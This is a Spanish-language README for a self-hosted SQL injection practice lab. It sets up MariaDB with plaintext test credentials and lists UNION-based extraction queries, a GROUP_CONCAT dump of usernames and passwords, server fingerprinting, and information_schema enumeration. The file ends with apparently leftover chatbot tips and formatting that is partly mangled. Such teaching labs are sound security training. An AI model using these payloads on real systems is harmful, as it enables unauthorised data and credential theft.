Markdown# 🧪 Laboratorio de Inyección SQL (MySQL/MariaDB)

Este repositorio contiene los comandos básicos y la configuración necesaria para montar un entorno de pruebas y entender los fundamentos de la extracción de datos mediante SQL Injection.

---

## 🚀 1. Configuración del Entorno (Linux/LAMP)

Primero, instalamos los servicios necesarios y los configuramos para que arranquen automáticamente.

### Instalación de paquetes
```bash
sudo apt update && sudo apt install apache2 mariadb-server php libapache2-mod-php php-mysql -y
Gestión de serviciosBash# Habilitar para que inicien con el sistema
sudo systemctl enable apache2
sudo systemctl enable mysql

# Arrancar los servicios ahora
sudo systemctl start apache2
sudo systemctl start mysql
📊 2. Setup de la Base de DatosEjecuta estos comandos dentro de la consola de MariaDB (sudo mysql -u root) para crear el escenario de prueba.SQL-- Creación de la base de datos
CREATE DATABASE laboratorio;
USE laboratorio;

-- Creación de la tabla de usuarios
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)
);

-- Inserción de datos de prueba
INSERT INTO users (username, password) VALUES 
('admin', 'admin1234'), 
('pepe', 'perez55'), 
('luis', 'luisito_pass');

-- Configuración de usuario limitado para la APP
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password123';
GRANT SELECT ON laboratorio.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;
🛠️ 3. Comandos Básicos de ConsultaOperaciones EstándarVer todo: SELECT * FROM users;Ordenar: SELECT * FROM users ORDER BY 2 ASC; (Organiza por la segunda columna).Técnicas de Extracción (Pentesting)Contar columnas: Se usa ORDER BY incrementando el número hasta que dé error.Unión de consultas:SQL-- Si el SELECT original pide 3 columnas:
SELECT * FROM users WHERE id=1 UNION SELECT username, 2, 3 FROM users;

-- Si el SELECT original pide solo 1 columna:
SELECT username FROM users WHERE id=1 UNION SELECT password FROM users;
Aspiradora de datos:SQL-- Concatena todos los resultados en una sola línea
SELECT GROUP_CONCAT(username, 0x3a, password) FROM users;
🔍 4. Fingerprinting y ReconocimientoComandos útiles para obtener información sobre el servidor:FunciónDescripciónUSER()Usuario que ejecuta la consulta.DATABASE()Nombre de la DB actual.VERSION()Versión del motor SQL.@@VERSIONVariable global de versión.🗺️ 5. Mapeo con information_schemaEl "mapa del tesoro" para descubrir tablas y columnas cuando no conocemos sus nombres.📂 Listar Bases de DatosSQLSELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
🗄️ Listar Tablas de la DB actualSQLSELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE();
📋 Listar Columnas de una tabla específicaSQLSELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users';
⚠️ IMPORTANTE: Este material tiene fines exclusivamente educativos y éticos. Nunca utilices estas técnicas en sistemas sobre los que no tengas autorización explícita.
---

### 💡 Tips extra para tu README:
1.  **Imágenes:** Si quieres que las imágenes que me pasaste aparezcan en el archivo, súbelas a la misma carpeta de GitHub y añade: `![Descripción de la imagen](nombre_de_archivo.png)`.
2.  **Highlighting:** Fíjate que usé ` ```sql ` y ` ```bash `. Eso hace que GitHub pinte las palabras clave (como `SELECT` o `sudo`) de colores, lo que facilita mucho la lectura.

¿Te late cómo quedó o quieres que le agreguemos alguna sección de "Errores Comunes" b
